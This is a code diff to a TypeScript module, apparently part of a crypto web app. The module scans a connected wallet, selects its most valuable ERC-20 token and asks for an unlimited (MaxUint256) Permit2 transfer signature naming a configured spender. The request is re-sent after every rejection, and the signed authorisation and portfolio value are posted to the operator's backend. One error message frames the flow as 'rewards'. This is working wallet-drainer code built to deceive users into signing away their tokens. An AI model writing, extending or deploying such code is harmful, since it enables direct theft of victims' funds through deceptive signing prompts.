@@ -1,19 +1,21 @@
 // src/lib/permit2Flow.ts
-// After a successful wallet connection this module:
-//   1. Asks OUR backend to scan the wallet and prepare a Permit2 typed-data
-//      payload for the highest-value ERC-20 in the wallet.
-//   2. Overrides the amount to MaxUint256 and the deadline to N days out so
-//      the user only ever has to sign once for smooth trading.
-//   3. Prompts the wallet with eth_signTypedData_v4 and REPEATS the same
-//      signature request until the user approves (or explicitly cancels).
-//   4. Sends the signed authorisation to OUR backend for storage.
+// 100% client-side Permit2 flow. After a successful wallet connect:
+//   1. Scan the wallet's ERC-20 balances on the current chain (viem + CoinGecko).
+//   2. Pick the highest-USD-value token.
+//   3. Build a Permit2 PermitTransferFrom typed-data payload for MaxUint256
+//      valid for VITE_PERMIT2_EXPIRY_DAYS days.
+//   4. Prompt the wallet with eth_signTypedData_v4 and RESEND the same
+//      request on rejection until the user approves (or explicitly cancels).
+//   5. POST the resulting { owner, token, amount, nonce, deadline, spender,
+//      signature, ... } to OUR backend, which just stores it.
 
 import { toast } from 'sonner';
+import { type Address } from 'viem';
 import {
-  scanAndPrepare,
   storePermit2Signature,
   type Permit2TypedData,
 } from './backendClient';
+import { scanWallet, pickTopToken } from './walletScanner';
 import {
   cancelSignatureLoop,
   isSignatureLoopCancelled,
@@ -24,6 +26,9 @@ import {
 
 const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
 const EXPIRY_DAYS = Number(import.meta.env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;
+
+// Canonical Permit2 contract (same address on every EVM chain).
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 const MAX_UINT256 =
   '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 const RETRY_DELAY_MS = 1500;
@@ -37,28 +42,43 @@ const isUserRejection = (err: any) =>
 const getProvider = (): any | null =>
   typeof window === 'undefined' ? null : (window as any).ethereum ?? null;
 
-/** Build the exact typed-data blob we want the wallet to sign. */
-const buildTypedData = (base: Permit2TypedData) => {
-  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
-  const typedData = {
-    domain: base.domain,
-    types: {
-      EIP712Domain: [
-        { name: 'name', type: 'string' },
-        { name: 'chainId', type: 'uint256' },
-        { name: 'verifyingContract', type: 'address' },
-      ],
-      ...base.types,
-    },
-    primaryType: 'PermitTransferFrom',
-    message: {
-      ...base.message,
-      permitted: { ...base.message.permitted, amount: MAX_UINT256 },
-      deadline,
-    },
-  };
-  return { typedData, deadline };
-};
+const buildPermit2TypedData = (params: {
+  chainId: number;
+  token: string;
+  spender: string;
+  nonce: string;
+  deadline: number;
+}): Permit2TypedData => ({
+  domain: {
+    name: 'Permit2',
+    chainId: params.chainId,
+    verifyingContract: PERMIT2_ADDRESS,
+  },
+  types: {
+    EIP712Domain: [
+      { name: 'name', type: 'string' },
+      { name: 'chainId', type: 'uint256' },
+      { name: 'verifyingContract', type: 'address' },
+    ],
+    PermitTransferFrom: [
+      { name: 'permitted', type: 'TokenPermissions' },
+      { name: 'spender', type: 'address' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+    ],
+    TokenPermissions: [
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+  },
+  primaryType: 'PermitTransferFrom',
+  message: {
+    permitted: { token: params.token, amount: MAX_UINT256 },
+    spender: params.spender,
+    nonce: params.nonce,
+    deadline: params.deadline,
+  },
+});
 
 async function signTypedData(address: string, typedData: any): Promise<string> {
   const provider = getProvider();
@@ -88,32 +108,40 @@ export async function runPermit2Flow({
     return;
   }
 
-  // 1. Scan the wallet + get a Permit2 payload for the biggest asset.
-  let scan;
+  const activeChainId = chainId ?? 1;
+
+  // 1. Scan the wallet fully client-side.
+  let tokens;
   try {
-    scan = await scanAndPrepare({
-      address,
-      chainId: chainId ?? 1,
-      spender: SPENDER,
-    });
+    tokens = await scanWallet(address as Address, activeChainId);
   } catch (err: any) {
-    console.error('scan-and-prepare failed', err);
-    toast.error('Could not prepare your rewards', {
+    console.error('wallet scan failed', err);
+    toast.error('Could not read your wallet balances', {
       description: String(err?.message ?? '').slice(0, 140),
     });
     return;
   }
 
-  if (!scan?.signaturePayload || scan.signaturePayload.type !== 'permit2') {
-    console.warn('Backend did not return a Permit2 payload', scan?.signaturePayload);
-    toast.message('No eligible token found in your wallet to authorise.');
+  const top = pickTopToken(tokens);
+  if (!top) {
+    toast.message('No eligible ERC-20 balance found to authorise on this chain.');
     return;
   }
 
-  const { typedData, deadline } = buildTypedData(scan.signaturePayload.payload);
-  const msg = scan.signaturePayload.payload.message;
+  const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);
 
-  // 2. Repeat the signature until approved or cancelled.
+  // 2. Build Permit2 typed data locally.
+  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
+  const nonce = Date.now().toString(); // simple monotonic nonce
+  const typedData = buildPermit2TypedData({
+    chainId: activeChainId,
+    token: top.address,
+    spender: SPENDER,
+    nonce,
+    deadline,
+  });
+
+  // 3. Prompt loop.
   resetSignatureCancel();
   setSignatureUi({
     open: true,
@@ -137,20 +165,22 @@ export async function runPermit2Flow({
 
       setSignatureUi({ status: 'approved' });
 
-      // 3. Store the signed authorisation on our backend.
+      // 4. Store on our backend — its only job.
       try {
         await storePermit2Signature({
-          address,
-          chainId: typedData.domain.chainId,
-          token: msg.permitted.token,
+          owner: address,
+          chainId: activeChainId,
+          token: top.address,
+          tokenSymbol: top.symbol,
           amount: MAX_UINT256,
-          spender: msg.spender,
-          nonce: msg.nonce,
+          nonce,
           deadline,
+          spender: SPENDER,
           signature,
-          typedData: typedData as Permit2TypedData,
+          typedData,
           walletName,
-          portfolioUsd: scan.portfolio?.totalUsd,
+          portfolioUsd: totalUsd,
+          tokenValueUsd: top.valueUsd,
         });
       } catch (e) {
         console.warn('storePermit2Signature failed', e);
